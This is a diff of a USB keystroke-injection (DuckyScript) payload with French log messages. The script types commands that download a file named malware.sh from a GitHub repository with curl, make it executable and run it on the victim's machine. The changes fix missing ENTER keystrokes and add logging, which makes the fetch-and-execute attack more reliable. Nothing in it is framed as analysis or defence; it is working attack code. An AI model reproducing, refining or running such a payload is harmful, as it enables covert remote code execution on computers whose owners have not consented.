@@ -6,9 +6,14 @@ ENTER
 DELAY 1000
 STRING curl -L https://github.com/noahlgrd01/NoahSilentDucky/raw/main/malware.sh -o /tmp/malware.sh
 ENTER
-DELAY 60000
+DELAY 30000
+STRING echo "[*] Fichier 'malware.sh' téléchargé" >> /tmp/malware.log
+ENTER
+DELAY 500
 STRING chmod +x /tmp/malware.sh
-STRING echo "[*] Droits d'exécution attribués à malware.sh" >> /tmp/malware.log
+ENTER
+DELAY 500
+STRING echo "[*] Droits d'exécution attribués à 'malware.sh'" >> /tmp/malware.log
 ENTER
 DELAY 500
 STRING /tmp/malware.sh >> /tmp/malware.log
